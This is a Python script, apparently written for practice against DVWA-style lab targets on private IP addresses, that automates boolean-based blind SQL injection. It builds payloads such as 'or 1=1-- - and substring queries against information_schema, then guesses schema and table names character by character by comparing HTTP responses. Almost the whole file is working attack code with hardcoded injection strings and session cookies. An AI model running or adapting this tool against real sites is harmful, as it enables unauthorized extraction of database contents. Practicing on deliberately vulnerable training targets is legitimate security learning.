import requests
from enum import Enum

a = "http://10.1.200.158/sqli/example1.php?name=root' or substring((select schema_name from information_schema.schemata limit 0,1),1,1)='m'-- -"
b = "http://10.1.200.158/sqli/example1.php?name=root' or substring((select table_name from information_schema.tables limit 0,1),1,1)='m'-- -"
c = "http://10.1.200.158/sqli/example1.php?name=' or 1 = 1-- -"
d = "10.1.201.89/vulnerabilities/sqli_blind/?id=' or substring((select schema_name from information_schema.schemata limit 0,1),1,1)='m'-- -&Submit=Submit#"


class DataBaseOptions(Enum):
    databases = 0
    tables = 1
    content = 2


# Busca en la base de datos a partir de una inyeccion correcta
class SQLInjector:
    # region Constantes
    __entrada: str = ""
    # __entrada: str = "http://10.1.201.89/vulnerabilities/sqli_blind/?id="
    # __entrada: str = "http://10.0.2.6/sqli/example1.php?name=root"
    # __entrada: str = "http://testphp.vulnweb.com/listproducts.php?cat=1"
    __caracteres: str = 'abcdefghijklmnñopqrstuvwxyz0123456789_$,'
    __colaLinea: str = "'or 1=1-- -"
    __colaLineaError: str = "'and 1=0-- -"
    __cola: str = "'-- -"
    __parametroDivisor: str = ";PARAM;"
    __parametroDivisor2: str = ";PARAM_A_ADD;"
    __busqurdaDataBase: str = "select schema_name from information_schema.schemata"
    __busquedaTables: str = "select table_name from information_schema.tables"
    # __tochoComparador0: str = "' or substring(("
    __tochoComparador0: str = " or substring(("
    __tochoComparador1: str = " limit "
    __tochoComparador2: str = ",1),1,"
    __tochoComparador3: str = ")='"
    # endregion
    # region Variables modificables
    __iniciado: bool = False

    __resultadoPositivo: bytes
    __sesion = requests.Session()
    # endregion

    def __init__(self, url: str, cookiesrequiered: dict):
        self.__entrada = url
        self.__iniciado = True
        self.__sesion = requests.Session()
        for key in cookiesrequiered:
            self.__sesion.cookies.set(key, cookiesrequiered[key])
        linea = self.__entrada.replace(self.__parametroDivisor, self.__colaLineaError)
        print(linea)
        self.__resultadoPositivo = self.__sesion.get(url=linea).content

    def __generarString(self, fila: int, string: str, type: DataBaseOptions, comilla: bool):
        result = ""
        if comilla:
            result += "'"
        result += self.__tochoComparador0
        if type == DataBaseOptions.databases:
            result += self.__busqurdaDataBase
        elif type == DataBaseOptions.tables:
            result = self.__busquedaTables
        else:
            result += self.__busqurdaDataBase
        result += self.__tochoComparador1 + str(fila) + self.__tochoComparador2 + \
            str(string.__len__() + 1) + self.__tochoComparador3 + string + self.__parametroDivisor2
        return result

    def __buscarBases(self, fila: int, string: str, type: DataBaseOptions, comilla: bool):
        linea = self.__entrada.replace(self.__parametroDivisor,
                                       self.__generarString(fila=fila, string=string, type=type, comilla=comilla), 1)
        print(linea)
        lista: list = []
        for caracter in self.__caracteres:
            urldetrabajo = linea.replace(self.__parametroDivisor2, caracter + self.__cola)
            print(urldetrabajo)
            result = self.__sesion.get(url=urldetrabajo)
            if result.content != self.__resultadoPositivo:
                lista.append(caracter)
                break
        if lista.__len__() > 0:
            string = self.__buscarBases(fila, string + lista[0], type, comilla=comilla)
        return string

    # Si se ha inicializado con exito esto devolvera True
    def getIniciado(self):
        return self.__iniciado

    def buscarBlind(self, type: DataBaseOptions, comilla: bool):
        resultado: list = []
        if self.__iniciado is True:
            retorno: str = ""
            posicion: int = 0
            while retorno.__len__() > 0 or posicion == 0:
                retorno = self.__buscarBases(posicion, "", type, comilla)
                posicion += 1
                if retorno.__len__() > 0:
                    resultado.append(retorno)
        return resultado


dic = {"PHPSESSID": "nemnok27jp2vkhdikff0cc2971", "security": "low"}
s = SQLInjector("http://10.1.201.89/vulnerabilities/sqli_blind/?id=;PARAM;&Submit=Submit#", dic)
print(s.buscarBlind(DataBaseOptions.databases, True))
# print(s.generarStringDataBase(0, "mysql"))
"""
for value in urldividida:
    if value .__len__() > 0:
        print(value)
    else:
        print("Contenido vacio")
urlBuena = "http://192.168.0.101/sqli/example1.php?name=root'and 1=1-- -"
"""
"""
for i in caracteres:
    print(i)
"""
"""
s = requests.Session()
s.cookies.set("PHPSESSID", "vesf85lptvdtv2hhmfsi6sluc3")
s.cookies.set("security", "low")
print(s.cookies)

r = s.get(url="http://192.168.0.100/vulnerabilities/sqli_blind/?id=1&Submit=Submit#")
print(r)
print(r.content)
print("")
"""
